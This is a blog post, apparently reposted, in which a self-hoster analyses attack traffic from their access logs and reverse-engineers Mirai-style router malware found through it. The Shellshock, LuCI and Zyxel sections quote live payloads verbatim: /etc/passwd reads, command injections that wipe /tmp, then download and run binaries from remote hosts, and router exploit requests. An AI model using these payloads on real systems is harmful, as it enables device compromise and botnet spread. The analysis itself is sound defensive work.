<!--yml
category: 未分类
date: 2024-05-27 15:16:57
-->

# I looked through attacks in my access logs. Here's what I found

> 来源：[https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/](https://nishtahir.com/i-looked-through-attacks-in-my-access-logs-heres-what-i-found/)

I've been self-hosting for over a decade. It's freeing because I own my data, and do not depend on any platform other than my cloud host, which I can easily switch off. Self-hosting gives much insight into what it takes to run a cloud service. Anyone who's had some practice doing this will likely tell you that the internet is a dangerous place.

Exposing any IP onto the public internet immediately invites a flood of malicious traffic. While it's undesirable there's a lot to learn from this traffic so I poked through my access logs to see what sorts of attacks I've been hit with recently.

> Note: I'm not a security expert. I'm just a curious developer who likes to poke around so please take any assertions I make with a grain of salt. I wasn't sure what the value would be in redacting the IP addresses of bad guys but I redacted them anyway erring on the side of caution. Additionally, I've redacted some of the more colorful language used by the attackers which included poor language such as slurs.

# Credential and configuration discovery

The most common attacks by a wide margin are directory traversal attacks in search of credentials. The most common appears to be in search of `.env` which usually contains application secrets.

```
[23/Jan/2024:03:41:01 +0000] 404 - GET http xxx.xxx.xxx.xxx "/laravel/.env" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" "-"

[23/Jan/2024:05:19:23 +0000] 404 - GET http xxx.xxx.xxx.xxx "/backend/.env" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"

[23/Jan/2024:06:07:05 +0000] 404 - GET http xxx.xxx.xxx.xxx "/api/.env" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"

[23/Jan/2024:06:11:20 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.env" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"

[25/Jan/2024:12:14:47 +0000] 404 - GET http xxx.xxx.xxx.xxx "//.env" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Go-http-client/1.1" "-" 
```

Additionally, attackers are looking for other common files that contain credentials. In my sample, they seem to be looking for AWS credentials and configuration files, as well as Git repositories.

```
[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/aws.yml" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.env.bak" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/info.php" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.aws/credentials" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:07:13:12 +0000] 404 - GET http xxx.xxx.xxx.xxx "/config/aws.yml" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"

[23/Jan/2024:12:10:17 +0000] 404 - GET http xxx.xxx.xxx.xxx "/.git/config" [Client xxx.xxx.xxx.xxx] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4859.172 Safari/537.36" "-" 
```

Other attacks seem to be looking for common directories that may have been accidentally exposed by the administrator. I have to guess that the names are guesses based on common names. I'd be curious to learn more about what their success rate is. Interestingly, the user agents for these attacks mention `Mozlila/5.0` which as far as I can tell is a typo of `Mozilla/5.0`. A search on [GitHub](https://github.com/search?q=%22User-Agent%22%3A+%22Mozlila%2F5.0%22&type=code&ref=nishtahir.com) (ignoring results attempting to block the user agent) hints that this is likely a typo that was made in a common tool that has been copied and pasted around.

```
[22/Jan/2024:21:03:33 +0000] 404 - GET http xxx.xxx.xxx.xxx "/old/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:33 +0000] 404 - GET http xxx.xxx.xxx.xxx "/new/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:35 +0000] 404 - GET http xxx.xxx.xxx.xxx "/test/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:36 +0000] 404 - GET http xxx.xxx.xxx.xxx "/backup/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"

[22/Jan/2024:21:03:36 +0000] 404 - GET http xxx.xxx.xxx.xxx "/temp/" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-" 
```

The attackers also seem to be looking for common remote access and configuration tools.

```
[22/Jan/2024:15:43:25 +0000] 404 - GET http xxx.xxx.xxx.xxx "/actuator/gateway/routes" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"

[23/Jan/2024:00:14:28 +0000] 404 - GET http xxx.xxx.xxx.xxx "/hudson" [Client xxx.xxx.xxx.xxx] [Length 122] [Gzip 1.35] "Mozilla/5.0 zgrab/0.x" "-"

[23/Jan/2024:03:33:44 +0000] 400 - GET http xxx.xxx.xxx.xxx "/ui/login.action" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"

[23/Jan/2024:14:20:05 +0000] 200 - GET http xxx.xxx.xxx.xxx "/?XDEBUG_SESSION_START=phpstorm" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-" 
```

The lesson here seems to be to expose the absolute bare minimum to the public internet. If you don't need it, don't expose it. If you must expose tools or directories, add some layer of authentication and if possible restrict access to specific IP addresses because bad actors will be looking for it.

# Shellshock

Next, we've got a bunch of attacks that seem to be exploiting the Shellshock vulnerability.

```
[24/Jan/2024:12:02:50 +0000] 200 - GET http xxx.xxx.xxx.xxx "/" [Client xxx.xxx.xxx.xxx] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" 
```

This vulnerability exploits Webservers that execute CGI scripts with a vulnerable bash version by allowing an attacker to execute arbitrary commands. When a CGI program starts, it sets environment variables with the content of the request, of note is `HTTP_USER_AGENT`. When the characters `() { :; };` are included, bash interprets that as a function that needs to be executed.

In this specific attack, the bad guy sent this function as the user agent.

```
() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd 
```

Let's break it down further.

1.  `() { ignored; };`: This part defines a function in Bash. The content inside the curly braces is the function body. The ignored command is a placeholder; it doesn't affect the execution but was likely included to prevent syntax errors.

2.  `echo Content-Type: text/html; echo ;`: These commands are part of the function body. They set the Content-Type header of the HTTP response to "text/html" and echo an empty line.

3.  `/bin/cat /etc/passwd`: This is the malicious command embedded within the function. It attempts to use the `cat` command to display the contents of the `/etc/passwd` file, which contains user account information.

If the attack was successful, the attacker would theoretically gain access to my user credentials as well as have a mechanism to execute arbitrary code on the server.

Like the directory traversal attack, the attacker guesses common directories and paths looking for an endpoint that responds favorably.

```
[24/Jan/2024:12:02:51 +0000] 400 - GET http xxx.xxx.xxx.xxx "/cgi-bin/status" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:51 +0000] 404 - GET http xxx.xxx.xxx.xxx "/cgi-bin/stats" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:52 +0000] 400 - GET http xxx.xxx.xxx.xxx "/cgi-bin/test" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:52 +0000] 404 - GET http xxx.xxx.xxx.xxx "/cgi-bin/status/status.cgi" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:53 +0000] 404 - GET http xxx.xxx.xxx.xxx "/test.cgi" [Client xxx.xxx.xxx.xxx] [Length 183] [Gzip 3.21] "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:53 +0000] 400 - GET http xxx.xxx.xxx.xxx "/debug.cgi" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd"

[24/Jan/2024:12:02:54 +0000] 400 - GET http xxx.xxx.xxx.xxx "/cgi-bin/test-cgi" [Client xxx.xxx.xxx.xxx] [Length 654] [Gzip -] "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36" "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd" 
```

# LuCI Injection

```
[23/Jan/2024:17:26:43 +0000] 404 - GET http xxx.xxx.xxx.xxx "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20rm%20-rf%20%2A%3B%20wget%20http%3A%2F%2F104.168.5.4%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B.%2Ftenda.sh)" [Client xxx.xxx.xxx.xxx] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/xxx.xxx.xxx.xxx Safari/537.36" "-" 
```

This time we've got an attack that seems to be targeting the LuCI web interface for OpenWRT routers. The attack attempts to inject a command into the country field of a form that downloads and executes a shell script that is hosted remote server. Let's break it down.

The malicious code is in the URL which has been URL encoded. Decoding the URL makes it easier to read.

```
/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh) 
```

Breaking it down,

1.  `/cgi-bin/luci/;stok=/locale`: This is the path to a CGI script in the LuCI interface. LuCI is a web-based interface for OpenWRT routers and similar embedded devices.

2.  `?form=country&operation=write&country=`: These are parameters passed to the CGI script.

3.  `$(cd /tmp; rm -rf *; wget http://xxx.xxx.xxx.xxx/tenda.sh; chmod 777 tenda.sh;./tenda.sh)`: This is a bash substitution command intended to be executed and the output is substituted into the URL. The command is trying to cd into the `/tmp` folder, delete all files, download a shell script from a remote server, and execute it.

> Please do not try what I am about to do yourself. At this point in my investigation, I have no idea what the script contains or what it does. I'm taking a calculated risk and have taken measures to keep myself safe. If you're not sure what you're doing, attempting to do the same could cause you to end up with a compromised machine.

Downloading the script to investigate further, I discovered that the attacker aimed to download and execute an additional binary.

```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lol http://xxx.xxx.xxx.xxx/mips; chmod +x lol; ./lol tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lmao http://xxx.xxx.xxx.xxx/mpsl; chmod +x lmao; ./lmao tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ██████ http://xxx.xxx.xxx.xxx/x86_64; chmod +x ██████; ./██████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ███ http://xxx.xxx.xxx.xxx/arm; chmod +x ███; ./███ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O █████ http://xxx.xxx.xxx.xxx/arm5; chmod +x █████; ./█████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ██████ http://xxx.xxx.xxx.xxx/arm6; chmod +x ██████; ./██████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████ http://xxx.xxx.xxx.xxx/arm7; chmod +x ████; ./████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████ http://xxx.xxx.xxx.xxx/i586; chmod +x ████; ./████ tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kekw http://xxx.xxx.xxx.xxx/i686; chmod +x kekw; ./kekw tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O what http://xxx.xxx.xxx.xxx/powerpc; chmod +x what; ./what tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kys http://xxx.xxx.xxx.xxx/sh4; chmod +x kys; ./kys tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O ████eater http://xxx.xxx.xxx.xxx/m68k; chmod +x ████eater; ./████eater tplink

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O blyat http://xxx.xxx.xxx.xxx/sparc; chmod +x blyat; ./blyat tplink 
```

The binaries appear to be named after the architecture of the target device which makes sense since the attacker may not know what architecture the device is running on. This would give them the most surface area to work with. (Note: I censored names because the attacker renamed the binaries to common slurs)

I proceeded to download a binary incompatible with my environment as an additional precaution and installed Ghidra to investigate further. Looking through the binary only had 3 functions without a lot of string data. However, there was a large segment of data that looked like this.

```
 00107eb6 45              ??         45h    E
        00107eb7 43              ??         43h    C
        00107eb8 7c              ??         7Ch    |
        00107eb9 50              ??         50h    P
        00107eba 52              ??         52h    R
        00107ebb 4f              ??         4Fh    O
        00107ebc 54              ??         54h    T
        00107ebd 5f              ??         5Fh    _
        00107ebe 57              ??         57h    W
        00107ebf 52              ??         52h    R
        00107ec0 49              ??         49h    I
        00107ec1 54              ??         54h    T
        00107ec2 45              ??         45h    E
        00107ec3 20              ??         20h
        00107ec4 66              ??         66h    f
        00107ec5 61              ??         61h    a
        00107ec6 69              ??         69h    i
        00107ec7 6c              ??         6Ch    l
        00107ec8 65              ??         65h    e
        00107ec9 64              ??         64h    d
        00107eca 2e              ??         2Eh    .
        00107ecb 0a              ??         0Ah
        00107ecc 00              ??         00h
        00107ecd 0a              ??         0Ah
        00107ece 00              ??         00h
        00107ecf 24 49 6e        ds         "$Info: This file is packed with the UPX executable packer http://upx.sf.net
                 66 6f 3a
                 20 54 68
        00107f1e 24 49 64        ds         "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All rights reserved
                 3a 20 55
                 50 58 20
        00107f6a 90              ??         90h
        00107f6b 90              ??         90h 
```

This segment stood out indicating that it's an embedded ELF binary that has been packed with [UPX](https://github.com/upx/upx?ref=nishtahir.com). Some quick research indicated that it's often misused by malware authors to obfuscate and compress their binaries. As long as the malware author didn't modify the UPX header or packed binary, we should be able to use UPX to unpack the binary.

```
root:~# upx -d mips
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     93732 <-     34932   37.27%   linux/mips    mips 
```

Success! We now have a lot more strings we can look at this time, which sheds a bit more light on what the malware was intended to do.

```
\x%02x
SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr
M-SEARCH * HTTP/1.1
HOST: xxx.xxx.xxx.xxx:1900
MAN: "ssdp:discover"
MX: 1
ST: urn:dial-multiscreen-org:service:dial:1
USER-AGENT: Google Chrome/60.0.3112.90 Windows

service:service-agent
 default
local
    TeamSpeak

Windows XP
nickname
<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
Connection: keep-alive
Accept: */*
Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"
Content-Length:
%s/%s
██████ got malware'd 
```

What stands out this time is M-SEARCH with the ST header. This is a UPnP command looking for devices that support the DIAL protocol on the network. Based on the accompanying XML payload it looks like the malware is programmed to scan for Huawei devices on the network that are vulnerable to command injection. This appears to have been identified as being part of the Mirai botnet.

I tried to download the referenced `yeye.mips` however the file didn't appear to be available when I attempted to fetch it. Perhaps the file is only available at certain times of the day or only responds to certain headers or user agents? Running `nmap` on the server revealed that there were only 2 open ports

```
nmap xxx.xxx.xxx.xxx
Nmap scan report for 25port.org (xxx.xxx.xxx.xxx)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE   Service
22/tcp  open    ssh
646/tcp filtered    ldp 
```

So this is where this journey came to an end.

# Zyxel Injection

```
[23/Jan/2024:17:56:29 +0000] 400 - GET http localhost "/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://xxx.xxx.xxx.xxx/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;" [Client xxx.xxx.xxx.xxx] [Length 252] [Gzip -] "-" "-" 
```

This time we have a shell command in the URL of a GET request. The command contains a bunch of `${IFS}` shell substitutions which we can clean up to make it easier to read.

```
/bin/zhttpd/ cd /tmp; rm -rf *mips*; wget http://xxx.xxx.xxx.xxx/huhu.mips; chmod 777 huhu.mips; ./huhu.mips zyxel.selfrep; 
```

This appears to be exploiting `zhttpd` which a quick search points out is an exploit available in Zyxel devices. Like the previous exploit, I decided to download the binary and poke around in Ghidra. Fortunately this time, the binary was not packed and as a result see what strings were contained to get a sense of what it was intended to do.

Looking through the strings a few items stood out.

```
004266a4    SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr  "SNQUERY: xxx.xxx.xxx.xxx:AAAAAA:xsvr"    ds
004266c8    M-SEARCH * HTTP/1.1
HOST: xxx.xxx.xxx.xxx:1900
MAN: "ssdp:discover"
MX: 1
ST: urn:dial-multiscreen-org:service:dial:1
USER-AGENT: Google Chrome/60.0.3112.90 Windows

    "M-SEARCH * HTTP/1.1\r\nHOST: xxx.xxx.xxx.xxx:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: urn:dial-multiscreen-org:service:dial:1\r\nUSER-AGENT: Google Chrome/60.0.3112.90 Windows\r\n\r\n" ds

...

00426fd0    HTTP/1.1 200 OK "HTTP/1.1 200 OK"   ds
00426fe0    skyljne.arm "skyljne.arm"   ds
00426fec    skyljne.arm5    "skyljne.arm5"  ds
00426ffc    skyljne.arm6    "skyljne.arm6"  ds
0042700c    skyljne.arm7    "skyljne.arm7"  ds
0042701c    skyljne.mips    "skyljne.mips"  ds
0042702c    skyljne.mpsl    "skyljne.mpsl"  ds
0042703c    skyljne.x86_64  "skyljne.x86_64"    ds
0042704c    skyljne.sh4 "skyljne.sh4"   ds
00427058    <?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>$(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/linuxxx -r /huhu.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>    "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g xxx.xxx.xxx.xxx -l /tmp/linuxxx -r /huhu.mips; /bin/busybox chmod 777 /tmp/linuxxx; /tmp/linuxxx selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"  ds
00427234    POST /ctrlt/DeviceUpgrade_1 HTTP/1.1 
```

Another DIAL protocol scan. Looking for vulnerable Huawei devices trying to download `huhu.mips` presumably as a form of self-replication.

```
0042763c    POST /goform/set_LimitClient_cfg HTTP/1.1
Cookie: user=admin

time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://xxx.xxx.xxx.xxx/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm *mpsl*;

    "POST /goform/set_LimitClient_cfg HTTP/1.1\r\nCookie: user=admin\r\n\r\ntime1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://xxx.xxx.xxx.xxx/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm *mpsl*;\r\n\r\n" ds 
```

Another standout was this command. which appear to be targetting routers according to [this](https://www.akamai.com/blog/security-research/cve-2023-26801-exploited-spreading-mirai-botnet?ref=nishtahir.com) post by Akamai

> To exploit this vulnerability, an attacker can send the following HTTP POST request to the "/goform/set_LimitClient_cfg" URL:
> ...
> Ensure that the "Cookie" header is set to "user=admin" since the program has no special checks for authentication or authorization. This means that no prior authentication is required to exploit the vulnerability.

At this point, we can conclude that this is likely an agent of the Mirai botnet. However, some sources also mention that it could be associated with the Linux Medusa as well.

# Conclusion

This is barely scratching the surface of my logs. There are dozens of other exploits that are being attempted daily I could poke through but this post has already gone long enough.

This experience does highlight the importance of keeping devices, especially IoT devices up to date, and if at all possible keep them off the public internet. If they must be exposed, keep them isolated as much as possible to their own VLAN.